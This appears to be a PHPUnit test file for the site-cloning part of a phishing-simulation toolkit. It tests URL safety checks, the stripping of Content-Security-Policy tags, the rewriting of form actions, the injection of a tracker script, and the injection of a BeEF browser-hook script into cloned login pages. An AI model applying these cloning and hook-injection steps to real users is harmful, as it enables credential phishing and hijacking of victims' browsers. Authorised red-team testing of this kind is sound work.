<?php

namespace TAPhish\Tests;

use PHPUnit\Framework\TestCase;

final class SiteClonerFiltersTest extends TestCase
{
    // --- clone_slugify ---------------------------------------------------

    public function testSlugifyLowercasesAndReplacesSpaces(): void
    {
        self::assertSame('acme-bank-login', clone_slugify('Acme Bank Login'));
    }

    public function testSlugifyStripsSymbolsAndCollapsesDashes(): void
    {
        self::assertSame('foo-bar', clone_slugify('foo!!!@@@bar'));
        self::assertSame('foo-bar', clone_slugify('---foo---bar---'));
    }

    public function testSlugifyCapsLengthAndTrimsTrailingDash(): void
    {
        $long = str_repeat('a', 60) . '-' . str_repeat('b', 30);
        $slug = clone_slugify($long, 50);
        self::assertSame(50, strlen($slug));
        self::assertStringEndsNotWith('-', $slug);
    }

    public function testSlugifyEmptyOnNonsense(): void
    {
        self::assertSame('', clone_slugify('!@#$%^&*'));
        self::assertSame('', clone_slugify(''));
    }

    // --- clone_is_safe_url -----------------------------------------------

    public function testSafeUrlAcceptsPublicHttps(): void
    {
        [$ok, $reason] = clone_is_safe_url('https://example.com/login');
        self::assertTrue($ok, (string) $reason);
        self::assertNull($reason);
    }

    public function testSafeUrlRejectsNonHttpScheme(): void
    {
        [$ok] = clone_is_safe_url('file:///etc/passwd');
        self::assertFalse($ok);
        [$ok2] = clone_is_safe_url('javascript:alert(1)');
        self::assertFalse($ok2);
    }

    public function testSafeUrlBlocksLocalhostByDefault(): void
    {
        [$ok] = clone_is_safe_url('http://localhost/');
        self::assertFalse($ok);
        [$ok2] = clone_is_safe_url('http://api.localhost/');
        self::assertFalse($ok2);
    }

    public function testSafeUrlBlocksPrivateIpRangesByDefault(): void
    {
        foreach (['http://127.0.0.1/', 'http://10.0.0.1/', 'http://192.168.1.1/', 'http://169.254.169.254/'] as $url) {
            [$ok] = clone_is_safe_url($url);
            self::assertFalse($ok, "expected $url to be blocked");
        }
    }

    public function testSafeUrlAllowsPrivateWhenOptedIn(): void
    {
        [$ok] = clone_is_safe_url('http://127.0.0.1/', true);
        self::assertTrue($ok);
    }

    public function testSafeUrlRejectsMalformed(): void
    {
        [$ok] = clone_is_safe_url('not a url');
        self::assertFalse($ok);
    }

    // --- clone_strip_csp_meta --------------------------------------------

    public function testStripsCspMetaTags(): void
    {
        $html = '<head><meta http-equiv="Content-Security-Policy" content="default-src \'self\'">'
            . '<title>x</title></head>';
        [$out, $count] = clone_strip_csp_meta($html);
        self::assertSame(1, $count);
        self::assertStringNotContainsString('Content-Security-Policy', $out);
        self::assertStringContainsString('<title>x</title>', $out);
    }

    public function testCspStripIsCaseInsensitive(): void
    {
        $html = '<META HTTP-EQUIV="content-security-policy" CONTENT="x">';
        [$out, $count] = clone_strip_csp_meta($html);
        self::assertSame(1, $count);
        self::assertSame('', trim($out));
    }

    public function testCspStripLeavesOtherMetaUntouched(): void
    {
        $html = '<meta charset="utf-8"><meta name="viewport" content="width=device-width">';
        [$out, $count] = clone_strip_csp_meta($html);
        self::assertSame(0, $count);
        self::assertSame($html, $out);
    }

    // --- clone_resolve_url -----------------------------------------------

    public function testResolveAbsolutePassthrough(): void
    {
        self::assertSame('https://x.com/a', clone_resolve_url('https://x.com/a', 'https://base.test/'));
    }

    public function testResolveProtocolRelative(): void
    {
        self::assertSame('https://cdn.x.com/a.js', clone_resolve_url('//cdn.x.com/a.js', 'https://base.test/p'));
    }

    public function testResolveRootRelative(): void
    {
        self::assertSame(
            'https://base.test/css/main.css',
            clone_resolve_url('/css/main.css', 'https://base.test/login')
        );
    }

    public function testResolveRelativePath(): void
    {
        self::assertSame(
            'https://base.test/a/b/style.css',
            clone_resolve_url('b/style.css', 'https://base.test/a/page.html')
        );
    }

    public function testResolveParentDotDot(): void
    {
        self::assertSame(
            'https://base.test/style.css',
            clone_resolve_url('../style.css', 'https://base.test/a/page.html')
        );
    }

    public function testResolveRejectsUnusable(): void
    {
        self::assertNull(clone_resolve_url('javascript:alert(1)', 'https://base.test/'));
        self::assertNull(clone_resolve_url('data:image/png;base64,iV', 'https://base.test/'));
        self::assertNull(clone_resolve_url('#section', 'https://base.test/'));
        self::assertNull(clone_resolve_url('mailto:x@y', 'https://base.test/'));
        self::assertNull(clone_resolve_url('', 'https://base.test/'));
    }

    // --- clone_rewrite_html ----------------------------------------------

    public function testRewriteAbsolutizesAnchorAndForm(): void
    {
        $html = '<a href="/login">x</a><form action="submit.php"><input></form>';
        $r = clone_rewrite_html($html, 'https://target.test/landing/');
        self::assertStringContainsString('href="https://target.test/login"', $r['html']);
        self::assertStringContainsString('action="https://target.test/landing/submit.php"', $r['html']);
    }

    public function testRewriteCollectsStylesheetAndImageAssets(): void
    {
        $html =
            '<link rel="stylesheet" href="/css/main.css">' .
            '<link rel="icon" href="/fav.ico">' .
            '<img src="/img/a.png"><img src="/img/a.png">';
        $r = clone_rewrite_html($html, 'https://target.test/');
        self::assertSame(['https://target.test/css/main.css'], $r['css_assets']);
        self::assertSame(['https://target.test/img/a.png'], $r['img_assets']);
    }

    public function testRewriteSkipsAssetsWhenDisabled(): void
    {
        $html = '<link rel="stylesheet" href="/x.css"><img src="/x.png">';
        $r = clone_rewrite_html($html, 'https://t.test/', ['download_css' => false, 'download_images' => false]);
        self::assertSame([], $r['css_assets']);
        self::assertSame([], $r['img_assets']);
    }

    public function testRewriteStripsCspAndWarns(): void
    {
        $html = '<head><meta http-equiv="Content-Security-Policy" content="default-src \'self\'"></head>';
        $r = clone_rewrite_html($html, 'https://t.test/');
        self::assertStringNotContainsString('Content-Security-Policy', $r['html']);
        self::assertNotEmpty($r['warnings']);
    }

    public function testRewriteInjectsTrackerBeforeHead(): void
    {
        $html = '<html><head><title>x</title></head><body></body></html>';
        $r = clone_rewrite_html($html, 'https://t.test/', ['tracker_url' => '/spear/track.js?rid=abc']);
        self::assertStringContainsString(
            '<script src="/spear/track.js?rid=abc"></script></head>',
            $r['html']
        );
    }

    public function testRewriteDoesNotInjectTrackerWhenNoHead(): void
    {
        $html = '<div>fragment</div>';
        $r = clone_rewrite_html($html, 'https://t.test/', ['tracker_url' => '/track.js']);
        self::assertStringNotContainsString('track.js', $r['html']);
    }

    public function testRewritePreservesJavascriptHrefUntouched(): void
    {
        $html = '<a href="javascript:void(0)">x</a>';
        $r = clone_rewrite_html($html, 'https://t.test/');
        self::assertStringContainsString('href="javascript:void(0)"', $r['html']);
    }

    // ---- Phase 3.52 task 5: BeEF hook injection -----------------------

    public function testInjectHookPlacesSnippetBeforeBodyClose(): void
    {
        $out = site_cloner_inject_hook(
            '<html><body>hi</body></html>',
            '<script async src="http://b:3000/hook.js"></script>'
        );
        self::assertStringContainsString(
            '<script async src="http://b:3000/hook.js"></script></body>',
            $out
        );
    }

    public function testInjectHookFallsBackToHtmlClose(): void
    {
        $out = site_cloner_inject_hook('<html>no body</html>', '<script>x</script>');
        self::assertStringContainsString('<script>x</script></html>', $out);
    }

    public function testInjectHookAppendsWhenNoClosingTagAtAll(): void
    {
        $out = site_cloner_inject_hook('partial html', '<script>x</script>');
        self::assertStringEndsWith('<script>x</script>', $out);
    }

    public function testInjectHookNoopOnEmptySnippet(): void
    {
        $html = '<html><body>hi</body></html>';
        self::assertSame($html, site_cloner_inject_hook($html, ''));
        self::assertSame($html, site_cloner_inject_hook($html, '   '));
    }

    public function testInjectHookHandlesUppercaseBodyTag(): void
    {
        $out = site_cloner_inject_hook('<HTML><BODY>x</BODY></HTML>', '<script>y</script>');
        self::assertStringContainsString('<script>y</script></BODY>', $out);
    }

    public function testInjectHookOnlyHitsFirstBodyClose(): void
    {
        // Pathological page with </body> inside a comment + the real one.
        $html = '<html><body>real<!-- </body> commented --></body></html>';
        $out = site_cloner_inject_hook($html, '<script>z</script>');
        // The injector replaces the FIRST </body> match — in this case the
        // commented one (regex is dumb on purpose; HTML parsing is out of
        // scope and the operator validates the rendered clone manually).
        // Documenting the behavior so a future change doesn't surprise us.
        self::assertSame(1, substr_count($out, '<script>z</script>'));
    }
}
